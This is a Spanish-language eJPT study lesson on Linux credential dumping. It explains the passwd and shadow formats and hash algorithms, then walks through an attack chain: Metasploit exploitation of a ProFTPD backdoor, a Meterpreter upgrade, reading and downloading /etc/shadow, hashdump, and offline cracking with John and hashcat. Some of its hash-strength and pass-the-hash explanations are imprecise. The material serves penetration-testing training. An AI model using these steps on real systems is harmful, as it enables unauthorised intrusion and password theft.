# Linux Credential Dumping

Esta lección cubre cómo Linux almacena las contraseñas, cómo los atacantes las extraen y cómo los hashes capturados se usan para el crackeo offline — técnicas críticas para el eJPT.

> ⚠️ **Nota**: Todas las técnicas requieren **acceso root** en el sistema Linux objetivo. A diferencia de Windows, los hashes de contraseñas de Linux **no pueden usarse directamente para la autenticación** — deben crackearse offline para obtener las contraseñas en texto plano.

---

## Cómo Linux Almacena las Contraseñas

Linux usa un **sistema de dos archivos** para almacenar la información de cuentas de usuario y los hashes de contraseñas por separado, proporcionando una capa de seguridad importante.

### El Archivo /etc/passwd

El archivo `/etc/passwd` almacena la **información básica de cuenta** para cada usuario del sistema.

```bash
cat /etc/passwd
```

**Datos clave**:
- Legible por **cualquier usuario** del sistema.
- **No** contiene hashes de contraseñas reales en Linux moderno.
- Cada línea representa una cuenta de usuario en este formato:

```
nombre_usuario:x:UID:GID:comentario:dir_home:shell
```

La `x` en el campo de contraseña significa que el hash real está almacenado en `/etc/shadow`. Si ves un hash directamente aquí en lugar de `x`, el sistema está desactualizado e inseguro.

### El Archivo /etc/shadow

El archivo `/etc/shadow` almacena los **hashes de contraseña reales** para todas las cuentas de usuario.

```bash
cat /etc/shadow
```

**Datos clave**:
- Legible **solo por root** — esta es una función de seguridad crítica.
- Cada línea sigue este formato:

```
nombre_usuario:$id$salt$hash:ultimo_cambio:min:max:aviso:inactivo:expire
```

El campo de hash (`$id$salt$hash`) te dice todo lo que necesitas:
- `$id` — identifica el **algoritmo de hashing** usado.
- `$salt` — valor aleatorio añadido antes del hashing (hace ineficaces las rainbow tables).
- `$hash` — el hash de contraseña real.

### Algoritmos de Hashing de Linux

El número después del primer `$` en el archivo shadow identifica el algoritmo:

| ID | Algoritmo | Fortaleza |
|----|-----------|----------|
| `$1` | MD5 | Débil — rápido de crackear |
| `$2` | Blowfish | Moderado |
| `$5` | SHA-256 | Fuerte |
| `$6` | SHA-512 | Muy Fuerte — el más común en Linux moderno |

Ejemplo de entrada en shadow:
```
root:$6$salt$hashedpassword:18000:0:99999:7:::
```
→ La contraseña de este usuario está hasheada con **SHA-512** (`$6`).

> **A diferencia de los hashes NTLM de Windows**, los hashes de Linux incluyen un **salt** — haciendo imposibles los ataques Pass-the-Hash e ineficaces las rainbow tables. El crackeo requiere ataques de fuerza bruta o diccionario contra cada hash individualmente.

---

## Volcado de Credenciales Linux vs Windows

| Característica | Linux | Windows |
|----------------|-------|---------|
| **Almacenamiento de hashes** | `/etc/shadow` (solo root) | Base de datos SAM (bloqueada por kernel) |
| **Algoritmo de hash** | MD5, SHA-256, SHA-512 (con salt) | LM / NTLM (sin salt) |
| **Pass-the-Hash** | ❌ No es posible | ✅ Posible con NTLM |
| **Rainbow tables** | ❌ El salt lo previene | ✅ Efectivas contra LM/NTLM |
| **Ataque principal** | Crackeo offline (Hashcat/John) | Pass-the-Hash / crackeo |

---

## Volcado de Hashes de Contraseñas de Linux

### Paso 1: Obtener Acceso Inicial

Ejecuta un escaneo Nmap para identificar servicios explotables:

```bash
nmap -sV -sC <target_ip>
```

Ejemplo — objetivo ejecutando **ProFTPD en el puerto 21**:

```bash
# Buscar exploits
searchsploit ProFTPD

# Lanzar Metasploit
msfconsole
msf6 > search ProFTPD
msf6 > use exploit/unix/ftp/proftpd_<version>_backdoor
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <tu_ip>
msf6 > exploit
```

### Paso 2: Mejorar a una Shell Apropiada

Si obtienes una sesión de shell básica, mejórala:

```bash
# Iniciar una shell bash interactiva apropiada
/bin/bash -i
```

Luego actualiza a una sesión Meterpreter para más capacidades:

```bash
# Pon en segundo plano la sesión de shell actual
# En Metasploit:
msf6 > sessions -u <session_id>
```

`sessions -u` actualiza automáticamente una shell básica a una sesión Meterpreter completa.

### Paso 3: Verificar Acceso Root

```bash
meterpreter > getuid
whoami   # Debe devolver: root
id
```

Necesitas root para acceder a `/etc/shadow`.

### Paso 4: Leer el Archivo Shadow Directamente

Con acceso root, lee el archivo shadow:

```bash
meterpreter > shell
cat /etc/shadow
```

Ejemplo de salida:
```
root:$6$abc123$hashedpassword...:18000:0:99999:7:::
admin:$6$xyz789$anotherhash...:18000:0:99999:7:::
```

Descarga los archivos a Kali para el crackeo offline:

```bash
meterpreter > download /etc/shadow /root/shadow.txt
meterpreter > download /etc/passwd /root/passwd.txt
```

### Paso 5: Usar el Módulo hashdump de Metasploit

Metasploit tiene un módulo de post-explotación dedicado que vuelca los hashes de Linux en un formato listo para crackear:

```bash
meterpreter > background
msf6 > use post/linux/gather/hashdump
msf6 > set SESSION <session_id>
msf6 > run
```

Formato de salida: `nombre_usuario:$id$salt$hash`

---

## Crackeo de Hashes de Linux

A diferencia de Windows, **no puedes usar los hashes de Linux directamente** para la autenticación — debes crackearlos para obtener la contraseña en texto plano.

### Método A: Unshadow + John the Ripper

Primero, combina `/etc/passwd` y `/etc/shadow` en un único archivo crackeable:

```bash
# En Kali — combinar los dos archivos
unshadow /root/passwd.txt /root/shadow.txt > /root/unshadowed.txt

# Crackear con John the Ripper usando una wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /root/unshadowed.txt

# Ver contraseñas crackeadas
john --show /root/unshadowed.txt
```

### Método B: Hashcat

Hashcat es más rápido para el crackeo acelerado por GPU:

```bash
# SHA-512 (modo 1800), SHA-256 (modo 7400), MD5 (modo 500)
hashcat -m 1800 /root/shadow.txt /usr/share/wordlists/rockyou.txt

# Ver contraseñas crackeadas
hashcat -m 1800 /root/shadow.txt --show
```

### Referencia de Modos de Hashcat para Hashes de Linux

| ID de Hash | Algoritmo | Modo Hashcat |
|-----------|-----------|-------------|
| `$1` | MD5 | `500` |
| `$2` | Blowfish | `3200` |
| `$5` | SHA-256 | `7400` |
| `$6` | SHA-512 | `1800` |

---

## Cadena de Ataque Completa

```
Escaneo Nmap → Explotar Servicio → Shell → Actualizar a Meterpreter → Acceso Root → Volcar /etc/shadow → Crackear Hashes
```

| Paso | Acción | Herramienta |
|------|--------|------------|
| **1** | Escanear servicios explotables | Nmap |
| **2** | Explotar servicio | Metasploit |
| **3** | Actualizar shell | `sessions -u <id>` |
| **4** | Verificar acceso root | `getuid` / `whoami` |
| **5** | Volcar hashes | `cat /etc/shadow` / `post/linux/gather/hashdump` |
| **6** | Descargar archivos | `download /etc/shadow` |
| **7** | Crackear hashes offline | John the Ripper / Hashcat |

---

## Puntos Clave

- Linux usa **dos archivos** para el almacenamiento de credenciales: `/etc/passwd` (público, info de cuenta) y `/etc/shadow` (solo root, hashes de contraseñas).
- `/etc/passwd` es legible por todos los usuarios pero **no contiene hashes reales** en Linux moderno — solo un marcador de posición `x`.
- `/etc/shadow` es legible **solo por root** — este es el control de seguridad principal que protege los hashes de contraseñas.
- El formato de hash `$id$salt$hash` te indica el **algoritmo** (`$6` = SHA-512), el **salt** y el **hash**.
- Los hashes de Linux incluyen un **salt** — las rainbow tables y los ataques Pass-the-Hash **no son posibles**. El crackeo offline es la única opción.
- Algoritmos comunes: `$1` = MD5 (débil), `$5` = SHA-256, `$6` = SHA-512 (el más común en sistemas modernos).
- Usa **`sessions -u <id>`** en Metasploit para actualizar una shell básica a una sesión Meterpreter completa.
- Usa **`post/linux/gather/hashdump`** para volcar hashes en un formato listo para crackear.
- **Descarga tanto `/etc/passwd` como `/etc/shadow`** — necesitas ambos para `unshadow` + John the Ripper.
- **`unshadow`** combina ambos archivos en un único formato crackeable para John the Ripper.
- **John the Ripper**: `john --wordlist=rockyou.txt unshadowed.txt` → `john --show` para mostrar resultados.
- **Hashcat**: usa el modo `1800` para SHA-512 (`$6`), `7400` para SHA-256 (`$5`), `500` para MD5 (`$1`).
- A diferencia de Windows, las **contraseñas en texto plano** crackeadas son las que usas para acceso posterior — no los hashes en sí mismos.
